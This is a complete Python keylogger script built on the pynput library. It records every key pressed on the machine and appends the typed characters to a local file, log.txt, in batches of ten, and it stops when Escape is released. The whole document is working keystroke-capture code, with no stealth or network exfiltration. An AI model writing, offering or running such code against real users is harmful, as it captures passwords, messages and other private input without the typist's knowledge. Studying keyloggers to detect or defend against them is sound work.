import pynput

from pynput.keyboard import Key, Listener

count = 0   #Tracks how many keys have been pressed
keys = []   #Tracks which keys have been pressed


#----------------------------------------------------------
#Records key presses and amount of keys pressed
#updates log.txt every time 10 keys have been pressed
#resets the count
#resets the keys-list
#----------------------------------------------------------
def on_press(key):
    global keys, count

    keys.append(key)    
    count+=1

    if count >= 10:     
        count = 0       
        write_file(keys)
        keys = []       

#----------------------------------------------------------
#opens log.txt in the "Append"-Mode
#replaces all single quotes with blank space 
#Whenever the Space-key is pressed, white-space is logged
#appends to log.txt
#----------------------------------------------------------
def write_file(keys):
    with open("log.txt", "a") as f:     
        for key in keys:
            k = str(key).replace("'", "")   
            if k.find("space") > 0:         
                f.write(' ')
            elif k.find("Key") == -1:        
                f.write(k)

#----------------------------------------------------------
#Quits the Keylogger when the Escape-key is pressed
#----------------------------------------------------------
def on_release(key):
    if key == Key.esc:                      
        return False

#----------------------------------------------------------
#Mandatory Pynput-loop
#----------------------------------------------------------
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()                         
    